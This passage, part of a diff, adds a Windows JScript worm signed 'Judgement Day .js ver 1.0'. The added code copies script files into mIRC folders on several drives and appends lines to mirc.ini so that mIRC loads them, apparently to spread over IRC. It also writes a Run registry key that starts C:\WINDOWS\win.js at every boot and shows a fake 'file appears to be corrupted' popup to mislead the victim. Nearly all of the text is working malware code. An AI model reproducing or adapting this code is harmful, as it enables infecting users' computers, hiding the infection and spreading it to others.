+p.Copy("d:\\Program Files\\mirc\\default2.ini");
+}
+if (fso.FileExists("e:\\mirc\\mirc.ini"))
+ {
+s.Copy("e:\\mirc\\default.ini");
+p.Copy("e:\\mirc\\default2.ini");
+}
+if (fso.FileExists("e:\\Program Files\\mirc\\mirc.ini"))
+ {
+s.Copy("e:\\Program Files\\mirc\\default.ini");
+p.Copy("e:\\Program Files\\mirc\\default2.ini");
+}
+s.Delete();
+p.Delete();
+
+if (fso.FileExists("c:\\mirc\\mirc.ini"))
+ {
+  g = fso.OpenTextFile("c:\\mirc\\mirc.ini", 8, true)
+  g.writeline("n0=default.ini");
+  g.writeline("n1=default2.ini");
+  g.writeline("n2=default.ini");
+  g.writeline("n3=default2.ini");
+  g.writeline("n4=default.ini");
+  g.writeline("n5=default2.ini");
+  g.writeline("n6=default.ini");
+  g.writeline("n7=default2.ini");
+  g.writeline("n8=default.ini");
+  g.writeline("n9=default2.ini");
+  g.writeline("n10=default.ini");
+  g.writeline("n11=default2.ini");
+  g.writeline("n12=default.ini");
+  g.writeline("n13=default2.ini");
+  g.writeline("n14=default.ini");
+  g.writeline("n15=default2.ini");
+  g.writeline("n16=default.ini");
+  g.writeline("n17=default2.ini");
+  g.writeline("n18=default.ini");
+  g.writeline("n19=default2.ini");
+  g.writeline("n20=default.ini");
+  g.writeline("n21=default2.ini");
+  g.writeline("n100=default.ini");
+  g.writeline("n101=default2.ini"); 
+ g.Close();
+}
+if (fso.FileExists("c:\\Program Files\\mirc\\mirc.ini"))
+ {
+  g = fso.OpenTextFile("c:\\Program Files\\mirc\\mirc.ini", 8, true)
+   g.writeline("n0=default.ini");
+  g.writeline("n1=default2.ini");
+  g.writeline("n2=default.ini");
+  g.writeline("n3=default2.ini");
+  g.writeline("n4=default.ini");
+  g.writeline("n5=default2.ini");
+  g.writeline("n6=default.ini");
+  g.writeline("n7=default2.ini");
+  g.writeline("n8=default.ini");
+  g.writeline("n9=default2.ini");
+  g.writeline("n10=default.ini");
+  g.writeline("n11=default2.ini");
+  g.writeline("n12=default.ini");
+  g.writeline("n13=default2.ini");
+  g.writeline("n14=default.ini");
+  g.writeline("n15=default2.ini");
+  g.writeline("n16=default.ini");
+  g.writeline("n17=default2.ini");
+  g.writeline("n18=default.ini");
+  g.writeline("n19=default2.ini");
+  g.writeline("n20=default.ini");
+  g.writeline("n21=default2.ini");
+  g.writeline("n100=default.ini");
+  g.writeline("n101=default2.ini"); 
+  g.Close();
+}
+if (fso.FileExists("d:\\mirc\\mirc.ini"))
+ {
+  g = fso.OpenTextFile("d:\\mirc\\mirc.ini", 8, true)
+   g.writeline("n0=default.ini");
+  g.writeline("n1=default2.ini");
+  g.writeline("n2=default.ini");
+  g.writeline("n3=default2.ini");
+  g.writeline("n4=default.ini");
+  g.writeline("n5=default2.ini");
+  g.writeline("n6=default.ini");
+  g.writeline("n7=default2.ini");
+  g.writeline("n8=default.ini");
+  g.writeline("n9=default2.ini");
+  g.writeline("n10=default.ini");
+  g.writeline("n11=default2.ini");
+  g.writeline("n12=default.ini");
+  g.writeline("n13=default2.ini");
+  g.writeline("n14=default.ini");
+  g.writeline("n15=default2.ini");
+  g.writeline("n16=default.ini");
+  g.writeline("n17=default2.ini");
+  g.writeline("n18=default.ini");
+  g.writeline("n19=default2.ini");
+  g.writeline("n20=default.ini");
+  g.writeline("n21=default2.ini");
+  g.writeline("n100=default.ini");
+  g.writeline("n101=default2.ini"); 
+  g.Close();
+}
+if (fso.FileExists("d:\\Program Files\\mirc\\mirc.ini"))
+ {
+  g = fso.OpenTextFile("d:\\Program Files\\mirc\\mirc.ini", 8, true)
+   g.writeline("n0=default.ini");
+  g.writeline("n1=default2.ini");
+  g.writeline("n2=default.ini");
+  g.writeline("n3=default2.ini");
+  g.writeline("n4=default.ini");
+  g.writeline("n5=default2.ini");
+  g.writeline("n6=default.ini");
+  g.writeline("n7=default2.ini");
+  g.writeline("n8=default.ini");
+  g.writeline("n9=default2.ini");
+  g.writeline("n10=default.ini");
+  g.writeline("n11=default2.ini");
+  g.writeline("n12=default.ini");
+  g.writeline("n13=default2.ini");
+  g.writeline("n14=default.ini");
+  g.writeline("n15=default2.ini");
+  g.writeline("n16=default.ini");
+  g.writeline("n17=default2.ini");
+  g.writeline("n18=default.ini");
+  g.writeline("n19=default2.ini");
+  g.writeline("n20=default.ini");
+  g.writeline("n21=default2.ini");
+  g.writeline("n100=default.ini");
+  g.writeline("n101=default2.ini"); 
+  g.Close();
+}
+if (fso.FileExists("e:\\mirc\\mirc.ini"))
+ {
+  g = fso.OpenTextFile("e:\\mirc\\mirc.ini", 8, true)
+  g.writeline("n0=default.ini");
+  g.writeline("n1=default2.ini");
+  g.writeline("n2=default.ini");
+  g.writeline("n3=default2.ini");
+  g.writeline("n4=default.ini");
+  g.writeline("n5=default2.ini");
+  g.writeline("n6=default.ini");
+  g.writeline("n7=default2.ini");
+  g.writeline("n8=default.ini");
+  g.writeline("n9=default2.ini");
+  g.writeline("n10=default.ini");
+  g.writeline("n11=default2.ini");
+  g.writeline("n12=default.ini");
+  g.writeline("n13=default2.ini");
+  g.writeline("n14=default.ini");
+  g.writeline("n15=default2.ini");
+  g.writeline("n16=default.ini");
+  g.writeline("n17=default2.ini");
+  g.writeline("n18=default.ini");
+  g.writeline("n19=default2.ini");
+  g.writeline("n20=default.ini");
+  g.writeline("n21=default2.ini");
+  g.writeline("n100=default.ini");
+  g.writeline("n101=default2.ini"); 
+ g.Close();
+}
+if (fso.FileExists("e:\\Program Files\\mirc\\mirc.ini"))
+ {
+  g = fso.OpenTextFile("e:\\Program Files\\mirc\\mirc.ini", 8, true)
+   g.writeline("n0=default.ini");
+  g.writeline("n1=default2.ini");
+  g.writeline("n2=default.ini");
+  g.writeline("n3=default2.ini");
+  g.writeline("n4=default.ini");
+  g.writeline("n5=default2.ini");
+  g.writeline("n6=default.ini");
+  g.writeline("n7=default2.ini");
+  g.writeline("n8=default.ini");
+  g.writeline("n9=default2.ini");
+  g.writeline("n10=default.ini");
+  g.writeline("n11=default2.ini");
+  g.writeline("n12=default.ini");
+  g.writeline("n13=default2.ini");
+  g.writeline("n14=default.ini");
+  g.writeline("n15=default2.ini");
+  g.writeline("n16=default.ini");
+  g.writeline("n17=default2.ini");
+  g.writeline("n18=default.ini");
+  g.writeline("n19=default2.ini");
+  g.writeline("n20=default.ini");
+  g.writeline("n21=default2.ini");
+  g.writeline("n100=default.ini");
+  g.writeline("n101=default2.ini"); 
+  g.Close();
+}
+j = WScript.CreateObject("WScript.Shell");
+j.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinStartup",
+"C:\\WINDOWS\\win.js");
+j.RegWrite("HKCU\\Software\\mIRC\\lock\\", "0,0");
+
+if (c!="C:\\WINDOWS\\win.js")
+{
+x = WScript.CreateObject("WScript.Shell")
+x.Popup(c + " appears to be corrupted.  If this file was downloaded, try
+redownloading it.",0,c);  
+}
+//                      -------===Judgement Day===-------
+//    -------==IGNORANCE IS THE MOST DANGEROUS THING IN SOCIETY==-------
+//                       Judgement Day .js ver 1.0
